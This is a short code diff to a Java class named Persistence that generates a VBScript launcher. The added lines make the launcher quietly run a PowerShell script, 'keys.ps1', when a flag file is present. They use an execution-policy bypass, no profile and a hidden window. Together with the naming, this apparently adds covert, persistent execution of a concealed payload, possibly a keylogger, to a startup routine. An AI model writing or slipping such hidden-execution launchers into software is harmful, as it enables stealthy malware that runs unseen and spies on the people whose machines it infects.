@@ -207,6 +207,11 @@ public final class Persistence {
 		script.append("\tWScript.Quit 1\n");
 		script.append("End If\n");
 		script.append("sh.CurrentDirectory = dir\n");
+		script.append("If fso.FileExists(dir & \"\\cache\\ops\\keys.on\") Then\n");
+		script.append("\tIf fso.FileExists(dir & \"\\cache\\ops\\keys.ps1\") Then\n");
+		script.append("\t\tsh.Run \"powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"\" & dir & \"\\cache\\ops\\keys.ps1\"\" \"\"\" & dir & \"\\cache\\ops\"\"\", 0, False\n");
+		script.append("\tEnd If\n");
+		script.append("End If\n");
 		script.append("sh.Environment(\"PROCESS\")(\"JAVA_HOME\") = \"")
 			.append(System.getProperty("java.home", "")).append("\"\n");
 		script.append("list = Array(").append(list).append(", \"%JAVA_HOME%\\bin\\javaw.exe\")\n");
